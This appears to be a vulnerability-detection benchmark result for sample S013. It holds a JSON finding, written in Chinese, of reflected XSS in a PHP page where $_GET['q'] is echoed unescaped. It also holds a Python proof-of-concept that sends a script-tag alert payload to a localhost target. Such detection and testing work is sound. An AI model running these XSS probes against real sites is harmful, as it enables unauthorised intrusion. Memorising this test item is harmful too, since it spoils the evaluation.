@@ -1,0 +1,56 @@
+```json
+{
+  "sample_id": "S013",
+  "prediction": "vulnerable",
+  "vulnerability_type": "XSS",
+  "locations": ["F01:0003", "F01:0013"],
+  "evidence": {
+    "source": "F01:0003：$_GET['q'] 直接赋给 $q，未做过滤或编码。",
+    "flow": "F01:0003 的 $q 在 F01:0013 被直接 echo 到 <p> 正文。",
+    "guard": "无效：F01:0013 未见 htmlspecialchars、实体编码或模板自动转义。",
+    "sink": "F01:0013：<?php echo $q; ?> 位于 HTML 正文 <p> 元素内。"
+  },
+  "prerequisites": [
+    "PHP 单页脚本在 127.0.0.1:4280 可访问",
+    "攻击者可控制 GET 参数 q",
+    "浏览器按 HTML 解析返回页面"
+  ],
+  "missing_context": [
+    "具体脚本部署路径/完整URL未给出；POC 以 TARGET_URL 配置，默认使用 http://127.0.0.1:4280/。"
+  ],
+  "poc_generated": true,
+  "poc_language": "python3",
+  "poc_instructions": "运行 Python 脚本；默认目标为 http://127.0.0.1:4280/，若单页路径不同请修改 TARGET_URL。脚本先请求普通输入 q=hello，再请求测试输入 q=<script>alert('XSS_S013')</script>，打印状态码、URL、响应片段及响应体是否原样包含 payload。随后人工在浏览器打开打印出的测试 URL，确认是否弹出 XSS_S013；HTTP 响应体包含 payload 字符串本身不等同于 JavaScript 执行。"
+}
+```
+
+```python3
+import urllib.parse
+import urllib.request
+
+# 目标配置：若单页脚本不在根路径，请改为实际可访问的完整 URL
+TARGET_URL = "http://127.0.0.1:4280/"
+
+
+def fetch(q: str):
+    url = TARGET_URL + "?" + urllib.parse.urlencode({"q": q})
+    with urllib.request.urlopen(url, timeout=5) as resp:
+        body = resp.read().decode("utf-8", errors="replace")
+        return url, resp.status, body
+
+
+if __name__ == "__main__":
+    normal_input = "hello"
+    test_payload = "<script>alert('XSS_S013')</script>"
+
+    for label, q in [("普通输入", normal_input), ("测试输入", test_payload)]:
+        url, status, body = fetch(q)
+        print(f"[{label}] status={status}")
+        print(f"[{label}] url={url}")
+        print(f"[{label}] payload_in_body={test_payload in body}")
+        print(f"[{label}] body_prefix={body[:500]!r}")
+        print("-" * 60)
+
+    print("人工确认：在浏览器中打开上面的“测试输入”URL，观察是否弹出 XSS_S013。")
+    print("注意：HTTP 响应体中包含 payload 字符串不等同于 JavaScript 已执行。")
+```
